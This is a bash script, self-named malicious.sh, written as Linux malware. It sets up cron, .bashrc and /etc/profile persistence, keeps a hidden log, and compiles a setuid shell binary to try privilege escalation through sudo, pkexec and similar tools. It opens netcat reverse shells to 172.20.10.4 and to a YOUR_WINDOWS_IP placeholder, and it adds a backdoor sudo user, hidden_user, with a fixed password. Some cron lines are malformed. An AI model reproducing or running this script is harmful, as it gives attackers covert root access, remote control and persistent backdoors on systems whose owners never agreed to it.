#!/bin/bash

# Filename: malicious.sh
(crontab -l 2>/dev/null; echo "** ** * /bin/bash /tmp/malicious.sh") | crontab -
echo "Script started at $(date)" > /tmp/script_log

log_file="/tmp/.hidden_log"
touch "$log_file"
chmod 600 "$log_file"

log_activity() {
    echo "$(date): $1" >> "$log_file"
}

seek_root() {
    log_activity "Seeking root privileges..."
    echo "Seeking root..." >> /tmp/script_log
    # Try to exploit a common vulnerability
    echo 'void main() { setuid(0); system("/bin/bash"); }' > /tmp/privesc.c
    gcc /tmp/privesc.c -o /tmp/privesc 2>/dev/null
    chmod +s /tmp/privesc
    /tmp/privesc
    
    
    if [ "$(id -u)" -eq 0 ]; then
        log_activity "Already root. Maintaining stealth."
        echo "Already root!" >> /tmp/script_log
        return
    fi

    # Try various methods
    methods=("sudo" "pkexec" "passwd" "gpasswd" "chsh" "chfn" "newgrp")
    for method in "${methods[@]}"; do
        echo "Attempting $method..." >> /tmp/script_log
        $method /bin/bash -c "id && echo 'Root obtained via $method!' >> /tmp/script_log && $(declare -f); maintain_access" && exit 0
    done

    # If all else fails, try our reverse shell
    echo "Attempting reverse shell..." >> /tmp/script_log
    nc 172.20.10.4 4444 -e /bin/bash &

    log_activity "Root-seeking attempt finished. No luck this time."
    echo "Root-seeking finished." >> /tmp/script_log
}

maintain_access() {
    log_activity "Maintaining root access..."
    # Add a backdoor user
    useradd -m -s /bin/bash hidden_user
    echo "hidden_user:password" | chpasswd
    usermod -aG sudo hidden_user
    
    # Set up a persistent reverse shell
    echo "*/5* ** * nc YOUR_WINDOWS_IP 4444 -e /bin/bash" | crontab -
}

# Run the script persistently
(
    while true; do
        seek_root
        sleep 300
    done
) &

is_running() {
    ps aux | grep "[m]alicious.sh" > /dev/null
    return $?
}

if is_running; then
    echo "Script is already running. Exiting."
    exit 0
fi

# Set up persistence via multiple methods
echo "@reboot /path/to/malicious.sh" | crontab -
echo "/path/to/malicious.sh" >> ~/.bashrc
echo "/path/to/malicious.sh" >> /etc/profile

log_activity "Script initialized and running persistently"